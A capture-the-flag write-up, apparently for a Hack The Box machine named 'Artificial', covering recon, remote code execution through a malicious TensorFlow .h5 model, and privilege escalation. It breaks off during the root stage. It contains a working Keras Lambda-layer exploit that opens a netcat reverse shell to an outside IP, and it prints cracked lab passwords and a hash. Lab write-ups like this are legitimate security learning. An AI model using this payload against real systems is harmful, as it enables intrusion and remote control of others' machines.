starting with initial recon 

```
nmap -sV -sC -oN nmap.txt  -p- 10.10.11.74 --min-rate=5000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-17 16:21 CET
Nmap scan report for 10.10.11.74 (10.10.11.74)
Host is up (0.68s latency).
Not shown: 48960 filtered tcp ports (no-response), 16573 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 218.67 seconds
```

adding the domain to our `/etc/hosts `

`sudo echo "10.10.11.74     artificial.htb" >> /etc/hosts`

simple ass looking ui  

<img src="./assets/Pasted image 20251017162502.png">

registering a new account and logging in with it 

<img src="./assets/Pasted image 20251017162718.png">

this will lead us to the page where it present us with this .. 

<img src="./assets/Pasted image 20251017162855.png">

checking the `requirement.txt` and `Dockerfile` 

`Dockerfile`
```
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

`requirements.txt`
```
tensorflow-cpu==2.13.1
```

this version of tensorflow library might have some vurnabilitys .  

after searching i found this 

[https://github.com/advisories/GHSA-x4wf-678h-2pmq](https://github.com/advisories/GHSA-x4wf-678h-2pmq)

looking for POC to recreate the exploit 

[https://mastersplinter.work/research/tensorflow-rce/](https://mastersplinter.work/research/tensorflow-rce/)

the idea is to generate a `.h5` model that contains our malicious command so we can import it and get a reverse shell 

to recreate the exploit we need first to install tensorflow on our machine  (which is annoying task) 


```
import tensorflow as tf

def exploit(x):
    import os
    os.system("busybox nc 10.10.15.53 4444 -e /bin/sh")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

I always use busybox since its found on every linux distro . 

### generating our model 
```cmd
python3 exploit.py 
```

opening a listener on our machine 

<img src="./assets/Pasted image 20251017165134.png">

and finally importing our model will give us a shell 

<img src="./assets/Pasted image 20251017184622.png">

it didnt work ... 

<hr>

after digging a lil bit i found out the reason , it appeared that i need to boot up an entier container with that specific `Dockerfile` so just i can generate that `.h5` file 

```bash
docker build -t tensorflow-app .
```

<img src="./assets/Pasted image 20251018164048.png">

<img src="./assets/Pasted image 20251018164228.png">

an copying it to our machine , its a tedious task for me cuz i m doing everything from WSL , but first copying it from the container , and here the command if someone need it 

```bash
sudo docker cp 1b420c3ceba3:/code/exploit.h5 ./exploit.h5
```

uploading the model and done :)) , we got a shell 

<img src="./assets/Pasted image 20251018164755.png">

## PrivEscalation 

we start the usual with making a fully interactive shell 
```bash
script /dev/null -c bash
export TERM=xterm
```

we found another user called `gael` , and from i found something in the `/opt` folder 

```bash
total 36
drwxr-xr-x   8 root root 4096 Oct 18 10:39 .
drwxr-xr-x  18 root root 4096 Mar  3  2025 ..
drwxr-xr-x   5 root root 4096 Oct 18 16:00 backrest
-r--------   1 root root  155 Oct 18 10:39 config
drwx------ 258 root root 4096 Oct 18 10:39 data
drwx------   2 root root 4096 Oct 18 10:39 index
drwx------   2 root root 4096 Oct 18 10:39 keys
drwx------   2 root root 4096 Oct 18 10:52 locks
drwx------   2 root root 4096 Oct 18 10:39 snapshots
```

it appears like structure for something , but nothing interresting , altho , i found a local port open 

```bash
app@artificial:/opt$ ss -tulpn
ss -tulpn
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   Process
udp     UNCONN   0        0          127.0.0.53%lo:53            0.0.0.0:*
tcp     LISTEN   0        4096           127.0.0.1:9898          0.0.0.0:*
tcp     LISTEN   0        511              0.0.0.0:80            0.0.0.0:*
tcp     LISTEN   0        4096       127.0.0.53%lo:53            0.0.0.0:*
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*
tcp     LISTEN   0        2048           127.0.0.1:5000          0.0.0.0:*       users:(("gunicorn",pid=38371,fd=7),("gunicorn",pid=22263,fd=7),("gunicorn",pid=21324,fd=7),("gunicorn",pid=968,fd=7),("gunicorn",pid=805,fd=7))
tcp     LISTEN   0        511                 [::]:80               [::]:*
tcp     LISTEN   0        128                 [::]:22               [::]:*
```

```bash
app        22263  0.4 10.6 876352 425172 ?       Sl   15:18   0:13 /usr/bin/python3 /usr/bin/gunicorn -w 4 --error-logfile /dev/null --access-logfile /dev/null app:app -b 127.0.0.1:5000
app        56293  0.0  0.0   6300   716 pts/3    S+   16:08   0:00 grep --color=auto 22263
```
nothing interesting 
and i alsofound this `users.db` file 

theres two tables 

<img src="./assets/Pasted image 20251018171309.png">

and look at that.. we found hash for `gael`

<img src="./assets/Pasted image 20251018171439.png">

cracking that hash in crackstation getting us this 

<img src="./assets/Pasted image 20251018171610.png">

trying that `mattp005numbertwo` password on `gael` 

<img src="./assets/Pasted image 20251018172046.png">

## Root 

i missed a port i found earlier , it was on `8989` , after forwarding it ,it got me this 

<img src="./assets/Pasted image 20251018172751.png">

yeah whever , gael creds didnt work and the creds are stored on the config file which is protected by `root` , altho , theres a folder `backrest` that we can read 

```bash
total 51116
drwxr-xr-x 5 root root         4096 Oct 18 16:30 .
drwxr-xr-x 8 root root         4096 Oct 18 10:39 ..
-rwxr-xr-x 1 app  ssl-cert 25690264 Feb 16  2025 backrest
drwxr-xr-x 3 root root         4096 Mar  3  2025 .config
-rwxr-xr-x 1 app  ssl-cert     3025 Mar  3  2025 install.sh
-rw------- 1 root root           64 Mar  3  2025 jwt-secret
-rw-r--r-- 1 root root        77824 Oct 18 16:30 oplog.sqlite
-rw------- 1 root root            0 Mar  3  2025 oplog.sqlite.lock
-rw-r--r-- 1 root root        32768 Oct 18 16:30 oplog.sqlite-shm
-rw-r--r-- 1 root root            0 Oct 18 16:30 oplog.sqlite-wal
drwxr-xr-x 2 root root         4096 Mar  3  2025 processlogs
-rwxr-xr-x 1 root root     26501272 Mar  3  2025 restic
drwxr-xr-x 3 root root         4096 Oct 18 16:30 tasklogs
```

hold up !! theres the resitic command which is a backup binary .. so there must be a backup but where ?? 

```bash
gael@artificial:/var/backups$ ls -al
total 51972
drwxr-xr-x  2 root root     4096 Oct 18 06:25 .
drwxr-xr-x 13 root root     4096 Jun  2 07:38 ..
-rw-r--r--  1 root root    51200 Oct 18 06:25 alternatives.tar.0
-rw-r--r--  1 root root    38602 Jun  9 10:48 apt.extended_states.0
-rw-r--r--  1 root root     4253 Jun  9 09:02 apt.extended_states.1.gz
-rw-r--r--  1 root root     4206 Jun  2 07:42 apt.extended_states.2.gz
-rw-r--r--  1 root root     4190 May 27 13:07 apt.extended_states.3.gz
-rw-r--r--  1 root root     4383 Oct 27  2024 apt.extended_states.4.gz
-rw-r--r--  1 root root     4379 Oct 19  2024 apt.extended_states.5.gz
-rw-r--r--  1 root root     4367 Oct 14  2024 apt.extended_states.6.gz
-rw-r-----  1 root root 52357120 Mar  4  2025 backrest_backup.tar.gz
-rw-r--r--  1 root root      268 Sep  5  2024 dpkg.diversions.0
-rw-r--r--  1 root root      135 Sep 14  2024 dpkg.statoverride.0
-rw-r--r--  1 root root   696841 Jun  9 10:48 dpkg.status.0
```

whever its under root , wait . hold up , theres a  file on `/var/backups` i found it using this command 

```
find / -perm g=r -group sysadm 2>/dev/null 
```

since we are part of group called `sysadmin`

<img src="./assets/Pasted image 20251019154437.png">

and we found it , creds for backrest are `backrest_root` and that looks like a base64 , converting it giving us this 

```
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```

decrypting it with `john` giving us this ?
<img src="./assets/Pasted image 20251019155116.png">
well anyway we have `backrest_root` and `!@#$%^` , moving on to get a shell as root

it does not seem to have known privilage escalation exploit this version of backrest so we have to find it ourself 

creating a simple repo will get us this 

<img src="./assets/Pasted image 20251019160343.png">
trying to create a repo , i found one of the hooks has `command` variable 
<img src="./assets/Pasted image 20251019161155.png">

doesnt look suspicious to me , 
